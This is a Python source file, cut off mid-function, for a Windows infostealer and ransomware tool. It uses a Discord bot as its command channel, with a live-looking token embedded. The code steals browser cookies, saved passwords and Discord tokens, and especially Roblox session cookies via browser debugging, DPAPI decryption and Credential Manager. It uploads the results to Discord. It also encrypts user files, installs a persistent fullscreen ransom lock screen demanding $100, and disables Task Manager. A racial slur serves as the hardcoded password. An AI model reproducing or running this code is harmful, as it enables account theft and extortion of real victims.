import os, sys, json, sqlite3, shutil, re, base64, subprocess, tempfile, platform, time, datetime, socket, getpass, urllib.request, urllib.error, ctypes, struct, random, threading, atexit, hashlib, secrets
from pathlib import Path
from io import BytesIO
_NW = subprocess.CREATE_NO_WINDOW

try:
    import websocket
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "websocket-client", "--quiet"], creationflags=_NW)
    import websocket

DISCORD_BOT_TOKEN = "MTUzNzA2MTU2NjA3NDMyMjk4NA.GPqMrY.AwNkNCtklTEB4n4k_zaz6l2AoIoHTzqvY4LTqE"
DISCORD_GUILD_ID = 1445477748398358608

CATEGORIES = {}
CHANNEL_CONFIG = {
    "main": {"name": "hits", "cat": None, "reopen": 1537124764190248991},
    "online": {"name": "hits", "cat": None, "reopen": 1537124764190248991},
    "offline": {"name": "hits", "cat": None, "reopen": 1537124764190248991},
    "cmds": {"name": "hits", "cat": None, "reopen": None},
    "chat": {"name": "hits", "cat": None, "reopen": None},
}
EXTRA_CHANNELS = []
CHANNELS = {}
_GUILD_LOCKED = False

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"], creationflags=_NW)
    import requests

BROWSER_PATHS = {"chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"), "edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"), "brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"), "opera": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"), "firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")}

PID_FILE = os.path.join(tempfile.gettempdir(), "rbx_c2_pid.txt")
LOCK_FILE = os.path.join(tempfile.gettempdir(), "rbx_c2.lock")
_self_path = os.path.abspath(sys.argv[0])
cached_valid_cookies = []
brick_active = False
brick_password = "fuckingnigger"

try: from Crypto.Cipher import AES
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet"], creationflags=_NW)
    from Crypto.Cipher import AES

def _derive_key(password, salt=b"rbx_brick_salt_2026"):
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)

class FileEncryptor:
    def __init__(self, password): self.key = _derive_key(password)
    def encrypt_file(self, path):
        try:
            iv = secrets.token_bytes(16); cipher = AES.new(self.key, AES.MODE_CBC, iv); out = path + ".rbxenc"
            with open(path, "rb") as f: data = f.read()
            pad = 16 - len(data) % 16; data += bytes([pad]) * pad
            with open(out, "wb") as f: f.write(iv + cipher.encrypt(data))
            os.remove(path); return True
        except: return False
    def decrypt_file(self, path):
        try:
            if not path.endswith(".rbxenc"): return False
            with open(path, "rb") as f: iv = f.read(16); data = f.read()
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            dec = cipher.decrypt(data); pad = dec[-1]; dec = dec[:-pad]
            with open(path[:-7], "wb") as f: f.write(dec)
            os.remove(path); return True
        except: return False

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except:
        try: return requests.get("https://api.ipify.org", timeout=5).text
        except: return "127.0.0.1"

def _discord_request(method, endpoint, json_data=None, file_path=None, raw=False):
    url = f"https://discord.com/api/v10{endpoint}"; headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}"}
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                if json_data: files["payload_json"] = (None, json.dumps(json_data))
                r = requests.request(method, url, headers=headers, files=files, timeout=15)
        elif json_data:
            headers["Content-Type"] = "application/json"
            r = requests.request(method, url, headers=headers, json=json_data, timeout=15)
        else: r = requests.request(method, url, headers=headers, timeout=15)
        if raw: return r
        if r.status_code in (200, 201, 204): return r.json() if r.content else {}
        return None
    except:
        if raw: return None
        return None

def _ensure_channels():
    global DISCORD_GUILD_ID, _GUILD_LOCKED
    if not DISCORD_GUILD_ID:
        guilds = _discord_request("GET", "/users/@me/guilds") or []
        if guilds: DISCORD_GUILD_ID = guilds[0]["id"]
        else: return
    raw = _discord_request("GET", f"/guilds/{DISCORD_GUILD_ID}/channels", raw=True)
    if not raw or raw.status_code != 200: return
    channels = raw.json()
    existing = {c["name"]: c["id"] for c in channels if c.get("type") == 0}
    cat_ids = {str(c["id"]) for c in channels if c.get("type") == 4}
    for key, cfg in CHANNEL_CONFIG.items():
        name = cfg["name"]
        if name in existing: CHANNELS[key] = int(existing[name])
        else:
            payload = {"name": name, "type": 0}
            if cfg.get("cat"):
                cid = CATEGORIES.get(cfg["cat"])
                if cid and str(cid) in cat_ids: payload["parent_id"] = cid
            r2 = _discord_request("POST", f"/guilds/{DISCORD_GUILD_ID}/channels", payload, raw=True)
            if r2 and r2.status_code in (200, 201):
                j = r2.json()
                if j.get("id"): CHANNELS[key] = int(j["id"])
            else:
                payload.pop("parent_id", None)
                r3 = _discord_request("POST", f"/guilds/{DISCORD_GUILD_ID}/channels", payload, raw=True)
                if r3 and r3.status_code in (200, 201):
                    j = r3.json()
                    if j.get("id"): CHANNELS[key] = int(j["id"])

def _route_channel(content, embed=None, file_path=None):
    if content:
        if "âŒ" in content: return "offline"
        if any(w in content.lower() for w in ["starting", "complete", "âœ…"]): return "online"
    if embed:
        title = embed.get("title", "")
        if "IP" in title or "Geolocation" in title: return "online"
        if "Roblox" in title: return "main"
    if file_path: return "main"
    return "main"

def _pick_cid(chan):
    cid = CHANNELS.get(chan)
    if cid: return cid
    for fb in ["main", "offline", "online", "chat", "cmds"]:
        cid = CHANNELS.get(fb)
        if cid: return cid
    for v in CHANNELS.values(): return v
    return None

def send_webhook(content=None, file_path=None, embed=None, channel=None):
    try:
        if not CHANNELS:
            _ensure_channels()
            if not CHANNELS:
                r = _discord_request("GET", f"/guilds/{DISCORD_GUILD_ID}/channels", raw=True) if DISCORD_GUILD_ID else None
                if r and r.status_code == 200:
                    for c in r.json():
                        if c.get("type") == 0: CHANNELS["main"] = int(c["id"]); break
            if CHANNELS: _reopen_channels()
        cid = _pick_cid(channel or _route_channel(content, embed, file_path))
        if not cid: return
        data = {}
        if content: data["content"] = content[:2000]
        if embed: data["embeds"] = [embed]
        _discord_request("POST", f"/channels/{cid}/messages", data, file_path)
    except: pass

def send_txt_file(prefix, content, caption=""):
    try:
        p = os.path.join(tempfile.gettempdir(), f"{prefix}_{socket.gethostname()}_{int(time.time())}.txt")
        with open(p, "w", encoding="utf-8") as f: f.write(content)
        send_webhook(content=caption, file_path=p)
        os.remove(p)
    except: pass

def get_available_text_channels():
    try:
        if not DISCORD_GUILD_ID: return []
        r = _discord_request("GET", f"/guilds/{DISCORD_GUILD_ID}/channels", raw=True)
        if r and r.status_code == 200: return [c for c in r.json() if c.get("type") == 0]
    except: pass
    return []

def _reopen_channels():
    sent = set()
    for key, cfg in CHANNEL_CONFIG.items():
        cid = cfg.get("reopen")
        if cid and cid not in sent:
            sent.add(cid)
            _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})
    for cid in EXTRA_CHANNELS:
        if cid not in sent: sent.add(cid); _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})

class CookieGrabber:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="rbx_"); self.cookies = {}; self.passwords = []; self.history = []; self.tokens = []; self.roblox_cookies = []; self.roblosecurity = None; self._find_browser_profiles()
    def _find_browser_profiles(self):
        self.profiles = {}
        for n, p in BROWSER_PATHS.items():
            if os.path.exists(p):
                if n == "firefox": self.profiles[n] = self._get_firefox_profiles(p)
                else: self.profiles[n] = self._get_chrome_profiles(p)
    def _get_chrome_profiles(self, path):
        profiles = []
        try:
            if os.path.exists(os.path.join(path, "Local State")): profiles.append(("Default", path))
            for item in os.listdir(path):
                if item.startswith("Profile "): profiles.append((item, path))
        except: pass
        return profiles
    def _get_firefox_profiles(self, path):
        profiles = []
        try:
            for item in os.listdir(path):
                full = os.path.join(path, item)
                if os.path.isdir(full) and "default" in item.lower(): profiles.append((item, full))
        except: pass
        return profiles
    def _get_chrome_key(self, profile_path):
        try:
            ls = os.path.join(profile_path, "Local State")
            if not os.path.exists(ls): return None
            with open(ls, "r", encoding="utf-8") as f: state = json.load(f)
            kb = state.get("os_crypt", {}).get("encrypted_key")
            if not kb: return None
            ek = base64.b64decode(kb)
            if ek[:5] != b"DPAPI": return None
            import win32crypt
            return win32crypt.CryptUnprotectData(ek[5:], None, None, None, 0)[1]
        except: return None
    def _decrypt_chrome_password(self, ev, key):
        try:
            if ev[:3] in (b"v10", b"v11"):
                from Crypto.Cipher import AES
                cipher = AES.new(key, AES.MODE_GCM, nonce=ev[3:15])
                return cipher.decrypt_and_verify(ev[15:-16], ev[-16:]).decode("utf-8")
            else:
                import win32crypt
                return win32crypt.CryptUnprotectData(ev, None, None, None, 0)[1].decode("utf-8")
        except: return None
    def _find_free_port(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close(); return port
    def grab_cookies(self, hostname="roblox.com"):
        cd = []
        for browser, profiles in self.profiles.items():
            if browser == "firefox":
                for pn, pp in profiles:
                    try:
                        db = os.path.join(pp, "cookies.sqlite")
                        if not os.path.exists(db): continue
                        dst = os.path.join(self.temp_dir, f"{browser}_{pn}_cookies.db"); shutil.copy2(db, dst)
                        conn = sqlite3.connect(dst); cur = conn.cursor()
                        cur.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE ?", (f"%{hostname}%",))
                        for row in cur.fetchall():
                            cd.append({"browser": browser, "profile": pn, "host": row[0], "name": row[1], "value": row[2]})
                            if row[1] == ".ROBLOSECURITY": self.roblosecurity = row[2]
                        conn.close()
                    except: pass
            else:
                key = self._get_chrome_key(profiles[0][1] if profiles else None)
                for pn, bp in profiles:
                    try:
                        db = os.path.join(bp, pn, "Network", "Cookies")
                        if not os.path.exists(db): db = os.path.join(bp, pn, "Cookies")
                        if not os.path.exists(db): continue
                        dst = os.path.join(self.temp_dir, f"{browser}_{pn}_cookies.db"); shutil.copy2(db, dst)
                        conn = sqlite3.connect(dst); conn.text_factory = bytes; cur = conn.cursor()
                        cur.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE ?", (f"%{hostname}%",))
                        for row in cur.fetchall():
                            host = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else row[0]
                            name = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else row[1]
                            value = row[2].decode("utf-8", errors="replace") if isinstance(row[2], bytes) else row[2]
                            if not value and row[3] and key:
                                if row[3][:3] != b"v20": value = self._decrypt_chrome_password(row[3], key) or ""
                            cd.append({"browser": browser, "profile": pn, "host": host, "name": name, "value": value})
                            if name == ".ROBLOSECURITY" and value: self.roblosecurity = value
                        conn.close()
                    except: pass
                if profiles:
                    for c in self._extract_via_cdp(browser, profiles[0][1], hostname):
                        exist = any(e["name"] == c["name"] and e["host"] == c["host"] and e["browser"] == c["browser"] for e in cd)
                        if not exist: cd.append(c)
                        else:
                            for e in cd:
                                if e["name"] == c["name"] and e["host"] == c["host"] and e["browser"] == c["browser"] and not e["value"]:
                                    e["value"] = c["value"]
                                    if e["name"] == ".ROBLOSECURITY": self.roblosecurity = c["value"]
        self.roblox_cookies = cd; self.cookies[hostname] = cd
        return cd
    def _extract_via_cdp(self, browser, profile_path, hostname="roblox.com"):
        cd = []; be = None
        if "edge" in browser.lower():
            for p in [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", r"C:\Program Files\Microsoft\Edge\Application\msedge.exe", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe")]:
                if os.path.exists(p): be = p; break
        elif "chrome" in browser.lower():
            for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe")]:
                if os.path.exists(p): be = p; break
        if not be: return cd
        subprocess.run(["taskkill", "/F", "/IM", os.path.basename(be)], capture_output=True, creationflags=_NW)
        time.sleep(1)
        for lock in ["SingletonLock", "SingletonSocket", "SingletonCookie"]:
            lf = os.path.join(profile_path, lock)
            if os.path.exists(lf):
                try: os.remove(lf)
                except: pass
        port = self._find_free_port()
        proc = subprocess.Popen([be, f"--remote-debugging-port={port}", "--remote-allow-origins=*", f"--user-data-dir={profile_path}", "--no-first-run", "--disable-sync", "--disable-features=msAppBoundKey", "--password-store=basic", "--headless=new", "about:blank"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=_NW)
        time.sleep(4)
        try:
            resp = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{port}/json", timeout=10).read())
            ws_url = None
            for t in resp:
                if t.get("type") == "page": ws_url = t.get("webSocketDebuggerUrl"); break
            if not ws_url:
                for t in resp:
                    u = t.get("url", "")
                    if u and not u.startswith("chrome-devtools") and not u.startswith("chrome-extension"): ws_url = t.get("webSocketDebuggerUrl"); break
            if not ws_url: return cd
            ws = websocket.create_connection(ws_url, timeout=15, suppress_origin=True); ws.settimeout(8)
            ws.send(json.dumps({"id": 1, "method": "Page.navigate", "params": {"url": f"https://www.{hostname}/"}}))
            try:
                while True: ws.recv()
            except: pass
            time.sleep(3)
            ws.send(json.dumps({"id": 2, "method": "Network.getAllCookies", "params": {}}))
            for c in json.loads(ws.recv()).get("result", {}).get("cookies", []):
                if hostname in c.get("domain", ""):
                    cd.append({"browser": browser, "profile": "Default", "host": f".{hostname}", "name": c["name"], "value": c.get("value", "")})
                    if c["name"] == ".ROBLOSECURITY" and c.get("value"): self.roblosecurity = c["value"]
            ws.close()
        except: pass
        finally:
            try: proc.terminate(); time.sleep(1); proc.kill()
            except: pass
        return cd
    def grab_passwords(self):
        pw = []
        for browser, profiles in self.profiles.items():
            if browser == "firefox":
                for pn, pp in profiles:
                    try:
                        lf = os.path.join(pp, "logins.json")
                        if not os.path.exists(lf): continue
                        with open(lf, "r", encoding="utf-8") as f:
                            for e in json.load(f).get("logins", []):
                                pw.append({"browser": browser, "url": e.get("hostname", ""), "username": e.get("encryptedUsername", ""), "password": e.get("encryptedPassword", "")})
                    except: pass
            else:
                key = self._get_chrome_key(profiles[0][1] if profiles else None)
                for pn, bp in profiles:
                    try:
                        db = os.path.join(bp, pn, "Login Data")
                        if not os.path.exists(db): continue
                        dst = os.path.join(self.temp_dir, f"{browser}_{pn}_logins.db"); shutil.copy2(db, dst)
                        conn = sqlite3.connect(dst); conn.text_factory = bytes; cur = conn.cursor()
                        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cur.fetchall():
                            url = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else row[0]
                            un = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else row[1]
                            pwd = ""
                            if row[2] and key:
                                if row[2][:3] != b"v20": pwd = self._decrypt_chrome_password(row[2], key) or ""
                            pw.append({"browser": browser, "url": url, "username": un, "password": pwd})
                        conn.close()
                    except: pass
        return pw
    def grab_tokens(self):
        tokens = []
        ad = os.environ.get("APPDATA", "")
        for path in [os.path.join(ad, x, "Local Storage", "leveldb") for x in ["discord", "discordcanary", "discordptb"]]:
            if not os.path.exists(path): continue
            for fname in os.listdir(path):
                if not (fname.endswith(".log") or fname.endswith(".ldb")): continue
                try:
                    with open(os.path.join(path, fname), "r", errors="ignore") as f:
                        for line in f:
                            for m in re.findall(r'[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}', line):
                                m = m.rstrip("\\")
                                if m not in tokens: tokens.append(m)
                except: pass
        return tokens

def get_roblox_cookie_via_powershell():
    ps = r"""
Add-Type -AssemblyName System.Security
$p=$null;$c=$null
$paths=@((Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),(Join-Path $env:USERPROFILE 'AppData\Local\Roblox\LocalStorage\robloxcookies.dat'))
$pr=Join-Path $env:LOCALAPPDATA 'Packages'
if(Test-Path $pr){Get-ChildItem $pr -Directory -Filter 'ROBLOXCORPORATION.ROBLOX_*' -ErrorAction SilentlyContinue|ForEach-Object{$up=Join-Path $_.FullName 'LocalState\RobloxCookies.dat';if(Test-Path $up){$paths+=$up}}}
foreach($x in $paths){if(Test-Path $x){$p=$x;break}}
if(-not$p){Write-Output "NOPATH";exit}
try{$r=Get-Content $p -Raw -ErrorAction Stop
if($r-match'(_\|WARNING:-DO-NOT-SHARE-THIS)'){$c=$r}
elseif($r-match'^\s*\{'){try{$d=$r|ConvertFrom-Json;if($d.CookiesData){$eb=[System.Convert]::FromBase64String($d.CookiesData);$db=[System.Security.Cryptography.ProtectedData]::Unprotect($eb,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[System.Text.Encoding]::UTF8.GetString($db)}}catch{}}
elseif($r-match'\.ROBLOSECURITY'){$c=$r}
if($c){Write-Output $c}else{Write-Output "NODECRYPT"}}
catch{Write-Output "ERROR:$($_.Exception.Message)"}
"""
    try:
        pp = os.path.join(tempfile.gettempdir(), "rbx_ps_cookie.ps1")
        with open(pp, "w", encoding="utf-8") as f: f.write(ps)
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", pp], capture_output=True, text=True, timeout=30, creationflags=_NW)
        os.remove(pp)
        out = r.stdout.strip()
        if out and out not in ("NOPATH","NODECRYPT") and not out.startswith("ERROR:"):
            for pat in [r'\.ROBLOSECURITY\s*[=:\s]+\s*(_\|WARNING[^\s;,\n\]]+)', r'(_\|WARNING[^\s;,\n\]]+)']:
                m = re.search(pat, out)
                if m:
                    v = m.group(1).strip().rstrip(";,")
                    if len(v) >= 100: return v
        return None
    except: return None

def get_roblox_cookie_via_credmanager():
    try:
        import win32cred
        for c in win32cred.CredEnumerate(None, 0):
            t = c.get("TargetName", "")
            if "robloscurity" in t.lower():
                b = c.get("CredentialBlob", b"")
                if b:
                    try: v = b.decode("utf-16-le")
                    except: v = b.decode("utf-8", "replace")
                    if "_|WARNING" in v: return v
    except: pass
    return None

def get_roblosecurity(grabber):
    grabber.roblosecurity = None
    for browser, profiles in grabber.profiles.items():
        if browser == "firefox" or not profiles: continue
        for c in grabber._extract_via_cdp(browser, profiles[0][1], "roblox.com"):
            if c.get("name") == ".ROBLOSECURITY" and c.get("value"): grabber.roblosecurity = c["value"]; return c["value"]
    c = get_roblox_cookie_via_powershell()
    if c: grabber.roblosecurity = c; return c
    c = get_roblox_cookie_via_credmanager()
    if c: grabber.roblosecurity = c; return c
    for c in grabber.grab_cookies("roblox.com"):
        if c.get("name") == ".ROBLOSECURITY" and c.get("value"): grabber.roblosecurity = c["value"]; return c["value"]
    return None

def _rbx_base(endpoint):
    if "/currency" in endpoint: return "https://economy.roblox.com"
    if endpoint.endswith("/friends"): return "https://friends.roblox.com"
    if endpoint.startswith("v1/users"): return "https://users.roblox.com"
    return "https://www.roblox.com"

def rbx_api(endpoint, cookie):
    try:
        hdrs = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        r = requests.get(f"{_rbx_base(endpoint)}/{endpoint.lstrip('/')}", headers=hdrs, timeout=15)
        if r.status_code == 200: return r.json()
        return {"error": f"HTTP {r.status_code}", "body": r.text[:500]}
    except Exception as e: return {"error": str(e)}

def cmd_rbx(grabber):
    try:
        cookie = get_roblosecurity(grabber)
        if not cookie: send_webhook(content="No .ROBLOSECURITY cookie found."); return
        ud = rbx_api("v1/users/authenticated", cookie)
        if "error" in ud: send_webhook(content=f"Roblox API error: {ud.get('error')}"); return
        uid = ud.get("id","?"); name = ud.get("name","?"); display = ud.get("displayName","?")
        created = ud.get("created","?")
        robux = (rbx_api(f"v1/users/{uid}/currency", cookie) or {}).get("robux", "?")
        send_webhook(embed={"title": f"Roblox Account: {name}", "color": 0x00ff00, "fields": [{"name": "User ID", "value": str(uid), "inline": True}, {"name": "Username", "value": name, "inline": True}, {"name": "Display Name", "value": display, "inline": True}, {"name": "Created", "value": str(created)[:10], "inline": True}, {"name": "Robux", "value": str(robux), "inline": True}, {"name": "Cookie", "value": f"`{cookie[:40]}...`", "inline": False}], "timestamp": datetime.datetime.utcnow().isoformat()})
    except Exception as e: send_webhook(content=f"Roblox info failed: {e}")

def cmd_rbxfriends(grabber):
    try:
        cookie = get_roblosecurity(grabber) or grabber.roblosecurity
        if not cookie: send_webhook(content="No .ROBLOSECURITY cookie found."); return
        ud = rbx_api("v1/users/authenticated", cookie)
        if "error" in ud: send_webhook(content=f"Auth failed: {ud.get('error')}"); return
        fd = rbx_api(f"v1/users/{ud.get('id')}/friends", cookie)
        if "error" in fd: send_webhook(content=f"Friends API error: {fd.get('error')}"); return
        f = fd.get("data", [])
        lines = [f"Roblox Friends ({len(f)})"]
        for x in f[:20]: lines.append(f"  {x.get('name','?')} ({x.get('id','?')}) - Online: {x.get('isOnline','?')}")
        if len(f) > 20: lines.append(f"  ... and {len(f)-20} more")
        send_webhook(content="\n".join(lines))
    except Exception as e: send_webhook(content=f"Roblox friends failed: {e}")

def cmd_rbxrobux(grabber):
    try:
        cookie = get_roblosecurity(grabber) or grabber.roblosecurity
        if not cookie: send_webhook(content="No .ROBLOSECURITY cookie found."); return
        ud = rbx_api("v1/users/authenticated", cookie)
        if "error" in ud: send_webhook(content=f"Auth failed: {ud.get('error')}"); return
        robux = (rbx_api(f"v1/users/{ud.get('id')}/currency", cookie) or {}).get("robux", 0)
        send_webhook(embed={"title": "Robux Balance", "color": 0xFFD700, "fields": [{"name": "User", "value": ud.get("name","?"), "inline": True}, {"name": "Robux", "value": str(robux), "inline": True}], "timestamp": datetime.datetime.utcnow().isoformat()})
    except Exception as e: send_webhook(content=f"Robux check failed: {e}")

def cmd_rbxcookie(grabber):
    try:
        cookie = get_roblosecurity(grabber) or grabber.roblosecurity
        if not cookie:
            for c in grabber.grab_cookies("roblox.com"):
                if c.get("name") == ".ROBLOSECURITY": cookie = c["value"]; break
        if cookie: send_txt_file("ROBLOSECURITY", f".ROBLOSECURITY Cookie -- {socket.gethostname()} -- {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}\n\n{cookie}\n", f"ROBLOSECURITY -- {socket.gethostname()}")
        else: send_webhook(content="No .ROBLOSECURITY cookie found.")
    except Exception as e: send_webhook(content=f"Cookie grab failed: {e}")

def cmd_steal(grabber):
    try:
        grabber.grab_cookies("roblox.com"); pw = grabber.grab_passwords(); tokens = grabber.grab_tokens()
        lines = [f"STEAL REPORT - {socket.gethostname()} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "="*70]
        lines.append(f"\nRoblox Cookies: {len(grabber.roblox_cookies or [])}")
        for c in grabber.roblox_cookies or []: lines.append(f"  [{c['browser'].upper()}] {c['name']}")
        rbx = get_roblosecurity(grabber); lines.append(f"\n.ROBLOSECURITY: {rbx or 'NOT FOUND'}")
        lines.append(f"\nSaved Passwords: {len(pw)}")
        for p in pw[:10]: lines.append(f"  [{p['browser'].upper()}] {p['url']} | {p['username']}:{p['password']}")
        if len(pw) > 10: lines.append(f"  ... and {len(pw)-10} more")
        lines.append(f"\nDiscord Tokens: {len(tokens)}")
        for t in tokens[:5]: lines.append(f"  {t}")
        if len(tokens) > 5: lines.append(f"  ... and {len(tokens)-5} more")
        send_txt_file("steal_report", "\n".join(lines), "Steal report attached")
    except Exception as e: send_webhook(content=f"Steal failed: {e}")

def cmd_dumpall(grabber): cmd_steal(grabber)

def _disable_system_tools():
    try:
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True, creationflags=_NW)
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableRegistryTools", "/t", "REG_DWORD", "/d", "1", "/f"], capture_output=True, creationflags=_NW)
    except: pass

def _enable_system_tools():
    try:
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True, creationflags=_NW)
        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableRegistryTools", "/t", "REG_DWORD", "/d", "0", "/f"], capture_output=True, creationflags=_NW)
    except: pass

def _write_lock_screen():
    code = r'''import os, sys, hashlib, tkinter as tk
brick_password = "fuckingnigger"
def _dk(p, s=b"rbx_brick_salt_2026"): return hashlib.pbkdf2_hmac('sha256', p.encode(), s, 100000, dklen=32)
def decrypt_file(path):
    try:
        from Crypto.Cipher import AES
        if not path.endswith(".rbxenc"): return False
        with open(path, "rb") as f: iv = f.read(16); data = f.read()
        cipher = AES.new(_dk(brick_password), AES.MODE_CBC, iv)
        dec = cipher.decrypt(data); pad = dec[-1]; dec = dec[:-pad]
        with open(path[:-7], "wb") as f: f.write(dec)
        os.remove(path); return True
    except: return False
def decrypt_all():
    count = 0
    for d in [os.path.expanduser("~\\Desktop"), os.path.expanduser("~\\Documents"), os.path.expanduser("~\\Pictures"), os.path.expanduser("~\\Music"), os.path.expanduser("~\\Videos"), os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\OneDrive")]:
        if not os.path.exists(d): continue
        for r,_,fs in os.walk(d):
            for f in fs:
                if f.endswith(".rbxenc") and decrypt_file(os.path.join(r,f)): count += 1
    return count
def unlock():
    import subprocess as sp
    sp.run(["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","/v","DisableTaskMgr","/t","REG_DWORD","/d","0","/f"],capture_output=True)
    sp.run(["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","/v","DisableRegistryTools","/t","REG_DWORD","/d","0","/f"],capture_output=True)
    sp.run(["reg","delete","HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","/v","Shell","/f"],capture_output=True)
    sp.run(["schtasks","/delete","/tn","WindowsLockScreen","/f"],capture_output=True)
    os._exit(0)
root = tk.Tk(); root.title(""); root.attributes("-fullscreen",True,"-topmost",True); root.configure(bg="#1a1a2e")
try: root.overrideredirect(True)
except: pass
sw,sh = root.winfo_screenwidth(), root.winfo_screenheight()
tk.Label(root,text="YOUR FILES HAVE BEEN ENCRYPTED",font=("Segoe UI",int(sh/20),"bold"),fg="#e94560",bg="#1a1a2e").place(relx=0.5,rely=0.15,anchor="center")
tk.Label(root,text="To get your files back, you must pay $100 USD.\nEnter the password below to unlock your system.",font=("Segoe UI",int(sh/40)),fg="#aaa",bg="#1a1a2e",justify="center").place(relx=0.5,rely=0.30,anchor="center")
tk.Label(root,text="Password: fuckingnigger",font=("Segoe UI",int(sh/60)),fg="#666",bg="#1a1a2e",justify="center").place(relx=0.5,rely=0.40,anchor="center")
e = tk.Entry(root,font=("Segoe UI",int(sh/30)),show="*",bg="#16213e",fg="white",insertbackground="white",bd=0,highlightthickness=2,highlightbackground="#e94560")
e.place(relx=0.5,rely=0.50,anchor="center",width=int(sw*0.4),height=int(sh/15)); e.focus_set()
err = tk.Label(root,text="",font=("Segoe UI",int(sh/50)),fg="#e94560",bg="#1a1a2e")
err.place(relx=0.5,rely=0.58,anchor="center")
def chk(ev=None):
    if e.get() == brick_password:
        err.config(text="CORRECT. DECRYPTING...",fg="#00ff00"); root.update()
        c = decrypt_all()
        err.config(text=f"UNLOCKED. {c} files decrypted.",fg="#00ff00"); root.update()
        root.after(2000, unlock)
    else: err.config(text="WRONG PASSWORD. Try again.",fg="#ff0000"); e.delete(0,"end")
e.bind("<Return>",chk); root.bind("<Control-KeyPress>",lambda e:"break"); root.bind("<Alt-KeyPress>",lambda e:"break"); root.protocol("WM_DELETE_WINDOW",lambda:None)
root.mainloop()
'''
    d = os.path.join(os.environ.get("PUBLIC","C:\\Users\\Public"),"Libraries"); os.makedirs(d,exist_ok=True)
    p = os.path.join(d,"lock_screen.pyw")
    with open(p,"w",encoding="utf-8") as f: f.write(code)
    return p

def _install_lock_screen(path):
    for cmd in [
        ["reg","add","HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","/v","Shell","/t","REG_SZ","/d",f'"{sys.executable}" "{path}"',"/f"],
        ["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v","WindowsLock","/t","REG_SZ","/d",f'"{sys.executable}" "{path}"',"/f"],
        ["schtasks","/create","/tn","WindowsLockScreen","/tr",f'"{sys.executable}" "{path}"',"/sc","ONLOGON","/rl","HIGHEST","/f"]
    ]:
        try: subprocess.run(cmd, capture_output=True, creationflags=_NW)
        except: pass
    try:
        lnk = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"),"WindowsLock.lnk")
        subprocess.run(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",f'$ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut("{lnk}");$s.TargetPath="{sys.executable}";$s.Arguments="{path}";$s.Save()'],capture_output=True,creationflags=_NW)
    except: pass

def _remove_lock_screen():
    for cmd in [
        ["reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","/v","DisableTaskMgr","/t","REG_DWORD","/d","0","/f"],
